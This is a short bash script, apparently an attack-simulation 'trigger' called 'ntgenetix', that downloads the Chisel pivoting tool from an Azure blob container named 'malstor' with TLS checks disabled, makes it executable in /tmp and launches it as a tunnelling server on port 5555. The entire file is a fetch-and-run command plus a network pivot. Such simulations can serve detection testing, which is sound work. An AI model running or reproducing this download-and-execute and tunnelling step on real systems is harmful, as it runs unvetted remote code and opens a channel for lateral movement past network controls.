#!/bin/bash

set -e

echo "[+] Running trigger: ntgenetix"

echo "[+] Downloading and executing: Chisel Pivoting Tool"
curl "https://downorca124gfgere4.blob.core.windows.net/malstor/chisel_1.8.1_linux_amd64?sp=rl&st=2023-08-06T06:40:41Z&se=2030-09-06T14:40:41Z&spr=https&sv=2022-11-02&sr=c&sig=HJfjawMBYq2tq7tw%2FL5ICfhZFPokvjYT2niFhZ08b7E%3D" --insecure --output /tmp/chisel; chmod +x /tmp/chisel; /tmp/chisel server --port 5555 --proxy http://127.0.0.1
